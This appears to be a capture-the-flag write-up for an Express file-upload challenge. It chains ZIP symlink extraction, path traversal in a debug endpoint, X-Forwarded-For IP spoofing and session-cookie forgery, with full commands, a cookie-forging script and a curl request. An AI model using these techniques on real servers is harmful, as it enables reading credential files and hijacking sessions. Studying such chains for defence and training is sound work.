</span></span></code></pre></div><hr><h2 id=vulnerability-analysis>Vulnerability Analysis</h2><h3 id=vulnerability-1-symlink-preservation-in-zip-extraction>Vulnerability #1: Symlink Preservation in ZIP Extraction</h3><p>The first critical vulnerability lies in how the application handles ZIP file extraction. The code uses the system&rsquo;s <code>unzip</code> command without any flags to prevent symlink preservation:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>execFile</span><span class=p>(</span><span class=s1>&#39;unzip&#39;</span><span class=p>,</span> <span class=p>[</span><span class=nx>zipPath</span><span class=p>,</span> <span class=s1>&#39;-d&#39;</span><span class=p>,</span> <span class=nx>userDir</span><span class=p>],</span> <span class=p>(</span><span class=nx>err</span><span class=p>,</span> <span class=nx>stdout</span><span class=p>,</span> <span class=nx>stderr</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>fs</span><span class=p>.</span><span class=nx>unlinkSync</span><span class=p>(</span><span class=nx>zipPath</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><p><strong>Security Impact:</strong> By default, the <code>unzip</code> utility preserves symbolic links found in ZIP archives. An attacker can create a ZIP file containing symlinks to sensitive system files. When extracted, these symlinks will point to arbitrary filesystem locations, effectively bypassing the application&rsquo;s intended file isolation.</p><p>When a user downloads a symlinked file through the <code>/files/:filename</code> endpoint, the application follows the symlink and serves the target file&rsquo;s contents. This is because Node.js&rsquo;s <code>fs.statSync().isFile()</code> follows symlinks by default, and <code>res.download()</code> will read and serve the symlink target.</p><h4 id=why-this-works>Why This Works</h4><ul><li>The <code>unzip</code> command preserves symlinks without the <code>-L</code> flag</li><li>Node.js filesystem operations follow symlinks automatically</li><li>The path traversal check in <code>/files/:filename</code> validates the symlink path itself, not its target</li><li>The check <code>!filePath.startsWith(path.resolve(userDir))</code> passes because the symlink is physically located within <code>userDir</code></li></ul><h3 id=vulnerability-2-path-traversal-in-debug-endpoint>Vulnerability #2: Path Traversal in Debug Endpoint</h3><p>The debug endpoint contains a textbook path traversal vulnerability:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/debug/files&#39;</span><span class=p>,</span> <span class=nx>developmentOnly</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>userDir</span> <span class=o>=</span> <span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s1>&#39;../uploads&#39;</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>session_id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>fs</span><span class=p>.</span><span class=nx>readdir</span><span class=p>(</span><span class=nx>userDir</span><span class=p>,</span> <span class=p>(</span><span class=nx>err</span><span class=p>,</span> <span class=nx>files</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;Error reading files&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>render</span><span class=p>(</span><span class=s1>&#39;files&#39;</span><span class=p>,</span> <span class=p>{</span> <span class=nx>files</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><p><strong>Security Impact:</strong> The <code>session_id</code> query parameter is directly concatenated into the file path without any validation or sanitization. An attacker can inject path traversal sequences like <code>../../../</code> to access any directory on the system that the Node.js process has read permissions for.</p><h4 id=path-construction-breakdown>Path Construction Breakdown</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Normal request: /debug/files?session_id=abc123
</span></span></span><span class=line><span class=cl><span class=nx>__dirname</span>                    <span class=o>=</span> <span class=err>/home/aniket/src/routes</span>
</span></span><span class=line><span class=cl><span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(...,</span> <span class=s1>&#39;../uploads&#39;</span><span class=p>)</span> <span class=o>=</span> <span class=err>/home/aniket/src/uploads</span>
</span></span><span class=line><span class=cl><span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(...,</span> <span class=s1>&#39;abc123&#39;</span><span class=p>)</span>     <span class=o>=</span> <span class=err>/home/aniket/src/uploads/abc123</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Malicious request: /debug/files?session_id=../../../tmp
</span></span></span><span class=line><span class=cl><span class=nx>__dirname</span>                    <span class=o>=</span> <span class=err>/home/aniket/src/routes</span>
</span></span><span class=line><span class=cl><span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(...,</span> <span class=s1>&#39;../uploads&#39;</span><span class=p>)</span> <span class=o>=</span> <span class=err>/home/aniket/src/uploads</span>
</span></span><span class=line><span class=cl><span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(...,</span> <span class=s1>&#39;../../../tmp&#39;</span><span class=p>)</span> <span class=o>=</span> <span class=err>/home/aniket/tmp</span>
</span></span></code></pre></div><h3 id=vulnerability-3-weak-authentication-bypass>Vulnerability #3: Weak Authentication Bypass</h3><p>The debug endpoint is protected by a <code>developmentOnly</code> middleware that checks two conditions:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>module</span><span class=p>.</span><span class=nx>exports</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>userId</span> <span class=o>===</span> <span class=s1>&#39;develop&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>req</span><span class=p>.</span><span class=nx>ip</span> <span class=o>==</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>next</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>403</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;Forbidden: Development access only&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span></code></pre></div><p><strong>Requirements to Bypass:</strong></p><ul><li>Have a valid session with <code>userId</code> set to <code>'develop'</code></li><li>Request must appear to come from <code>127.0.0.1</code></li></ul><h4 id=ip-address-spoofing>IP Address Spoofing</h4><p>The application has trust proxy enabled in the server configuration:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s1>&#39;trust proxy&#39;</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
</span></span></code></pre></div><p>This setting makes Express trust the <code>X-Forwarded-For</code> header to determine the client&rsquo;s IP address. While this is necessary for applications behind reverse proxies, it creates a security vulnerability when the proxy doesn&rsquo;t properly validate or sanitize this header. An attacker can simply set <code>X-Forwarded-For: 127.0.0.1</code> to satisfy the IP check.</p><h3 id=vulnerability-4-session-secret-exposure>Vulnerability #4: Session Secret Exposure</h3><p>The application&rsquo;s session management reveals critical information in the server initialization code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>store</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>session</span><span class=p>.</span><span class=nx>MemoryStore</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>sessionData</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>cookie</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>path</span><span class=o>:</span> <span class=s1>&#39;/&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>httpOnly</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>maxAge</span><span class=o>:</span> <span class=mi>1000</span> <span class=o>*</span> <span class=mi>60</span> <span class=o>*</span> <span class=mi>60</span> <span class=o>*</span> <span class=mi>48</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=nx>userId</span><span class=o>:</span> <span class=s1>&#39;develop&#39;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Development session created with a fixed ID
</span></span></span><span class=line><span class=cl><span class=nx>store</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s1>&#39;&lt;redacted&gt;&#39;</span><span class=p>,</span> <span class=nx>sessionData</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=s1>&#39;Failed to create develop session:&#39;</span><span class=p>,</span> <span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Development session created!&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>session</span><span class=p>({</span>
</span></span><span class=line><span class=cl>  <span class=nx>secret</span><span class=o>:</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>SESSION_SECRET</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>resave</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>saveUninitialized</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>store</span><span class=o>:</span> <span class=nx>store</span>
</span></span><span class=line><span class=cl><span class=p>}));</span>
</span></span></code></pre></div><p><strong>Key Observations:</strong></p><ul><li>A development session is pre-created with <code>userId: 'develop'</code></li><li>The session secret is loaded from <code>.env</code> file via dotenv</li><li>The raw session ID is stored somewhere in the codebase (redacted in challenge)</li><li>Both <code>server.js</code> and <code>.env</code> are readable files within the application directory</li></ul><hr><h2 id=exploitation-strategy>Exploitation Strategy</h2><p>Now that we&rsquo;ve identified all the vulnerabilities, let&rsquo;s connect the dots. Here&rsquo;s our attack strategy:</p><ol><li><strong>Use symlink upload to read server configuration files</strong> - Extract <code>SESSION_SECRET</code> from <code>.env</code> and development <code>session_id</code> from <code>server.js</code></li><li><strong>Forge a valid developer session cookie</strong> - Use the extracted secret to create a properly signed session cookie</li><li><strong>Bypass IP and authentication checks</strong> - Access the debug endpoint with forged credentials</li><li><strong>Exploit path traversal</strong> - Navigate to the flag file using the debug endpoint&rsquo;s path traversal</li></ol><hr><h2 id=step-by-step-exploitation>Step-by-Step Exploitation</h2><h3 id=step-1-creating-malicious-symlinks>Step 1: Creating Malicious Symlinks</h3><p>First, we need to create symlinks pointing to the sensitive configuration files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Create symlink to the environment file</span>
</span></span><span class=line><span class=cl>ln -s /app/.env env
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Create symlink to the server configuration</span>
</span></span><span class=line><span class=cl>ln -s /app/server.js server
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Package them into a ZIP file</span>
</span></span><span class=line><span class=cl>zip --symlinks config.zip env server
</span></span></code></pre></div><p><strong>Important:</strong> Use the <code>--symlinks</code> flag when creating the ZIP to ensure symlinks are preserved rather than being followed and replaced with actual file contents.</p><h3 id=step-2-uploading-and-extracting-symlinks>Step 2: Uploading and Extracting Symlinks</h3><p>Upload the <code>config.zip</code> file through the application&rsquo;s upload interface. The server will:</p><ol><li>Store the uploaded file in <code>/tmp</code></li><li>Create a user directory at <code>/uploads/&lt;your-session-id></code></li><li>Extract the ZIP contents, preserving the symlinks</li><li>Redirect you to <code>/files</code> where you can see the extracted files</li></ol><h3 id=step-3-downloading-symlinked-files>Step 3: Downloading Symlinked Files</h3><p>Navigate to <code>/files</code> and click the download button for both <code>env</code> and <code>server</code> files.</p><p><strong>.env contents:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>SESSION_SECRET=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b
</span></span></span></code></pre></div><p><strong>server.js excerpt:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>store</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s1>&#39;amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E&#39;</span><span class=p>,</span> <span class=nx>sessionData</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=s1>&#39;Failed to create develop session:&#39;</span><span class=p>,</span> <span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Development session created!&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><p><strong>Extracted Credentials:</strong></p><ul><li><strong>Session Secret:</strong> <code>3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b</code></li><li><strong>Development Session ID:</strong> <code>amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E</code></li></ul><h3 id=step-4-forging-the-developer-session-cookie>Step 4: Forging the Developer Session Cookie</h3><p>Express.js uses signed cookies to prevent tampering. Create a Node.js script to generate the valid cookie:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>signature</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;cookie-signature&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Extracted values
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>sid</span> <span class=o>=</span> <span class=s1>&#39;amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>secret</span> <span class=o>=</span> <span class=s1>&#39;3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Sign the session ID
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>signed</span> <span class=o>=</span> <span class=s1>&#39;s:&#39;</span> <span class=o>+</span> <span class=nx>signature</span><span class=p>.</span><span class=nx>sign</span><span class=p>(</span><span class=nx>sid</span><span class=p>,</span> <span class=nx>secret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Forged Cookie:&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;connect.sid=&#39;</span> <span class=o>+</span> <span class=nx>signed</span><span class=p>);</span>
</span></span></code></pre></div><p><strong>Execute the script:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ node forge_cookie.js
</span></span><span class=line><span class=cl>Forged Cookie:
</span></span><span class=line><span class=cl>connect.sid<span class=o>=</span>s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE
</span></span></code></pre></div><h3 id=step-5-accessing-the-debug-endpoint>Step 5: Accessing the Debug Endpoint</h3><p>Now we can bypass authentication and access the debug endpoint:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -v http://localhost:3000/debug/files?session_id<span class=o>=</span>../../../g67phz7m <span class=se>\
</span></span></span><span class=line><span class=cl>  -H <span class=s2>&#34;Cookie: connect.sid=s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl>  -H <span class=s2>&#34;X-Forwarded-For: 127.0.0.1&#34;</span>
</span></span></code></pre></div><p><strong>Request Breakdown:</strong></p><ul><li><strong>session_id=../../../g67phz7m</strong> - Path traversal to access another user&rsquo;s folder</li><li><strong>Cookie header</strong> - Our forged developer session cookie</li><li><strong>X-Forwarded-For: 127.0.0.1</strong> - Spoofs the request as localhost</li></ul><h3 id=step-6-capturing-the-flag>Step 6: Capturing the Flag</h3><p>Create another symlink ZIP pointing to the flag file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Create symlink to the flag file</span>
</span></span><span class=line><span class=cl>ln -s /files/flag.txt flag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Package it</span>
</span></span><span class=line><span class=cl>zip --symlinks flag.zip flag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Upload and download to get the flag!</span>
</span></span></code></pre></div><p><strong>Flag Captured!</strong> By chaining multiple vulnerabilities together, we&rsquo;ve successfully compromised the application.</p></content><p></p></main><footer><footer><p style=text-align:center;margin-bottom:.5rem;color:#8f0000!important>trying.</p></footer></footer></body></html>